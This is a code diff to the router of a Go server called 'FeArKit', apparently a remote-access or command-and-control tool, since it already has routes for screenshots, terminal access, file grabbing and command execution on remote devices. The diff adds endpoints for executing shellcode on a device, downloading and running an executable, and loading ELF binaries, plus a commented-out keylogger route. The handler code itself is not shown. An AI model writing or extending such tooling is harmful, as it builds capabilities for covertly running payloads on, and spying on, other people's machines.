@@ -8,6 +8,8 @@ import (
 	"FeArKit/server/handler/process"
 	"FeArKit/server/handler/screenshot"
 	"FeArKit/server/handler/terminal"
+	"FeArKit/server/handler/shellcode"
+	"FeArKit/server/handler/executable"
 	"FeArKit/server/handler/utility"
 	"github.com/gin-gonic/gin"
 )
@@ -30,6 +32,10 @@ func InitRouter(ctx *gin.RouterGroup) {
 		group.POST(`/device/file/text`, file.GetDeviceTextFile)
 		group.POST(`/device/file/get`, file.GetDeviceFiles)
 		group.POST(`/device/exec`, utility.ExecDeviceCmd)
+		group.POST(`/device/shellcode`, shellcode.ExecDeviceShellcode)
+		group.POST(`/device/executable`, executable.DownloadAndExecute)
+		group.POST(`/device/loadelf`, shellcode.LoadElf)
+		//group.POST(`/device/keylogger/start`, keylogger.StartKeylogger)
 		group.POST(`/device/list`, utility.GetDevices)
 		group.POST(`/device/:act`, utility.CallDevice)
 		group.POST(`/client/check`, generate.CheckClient)
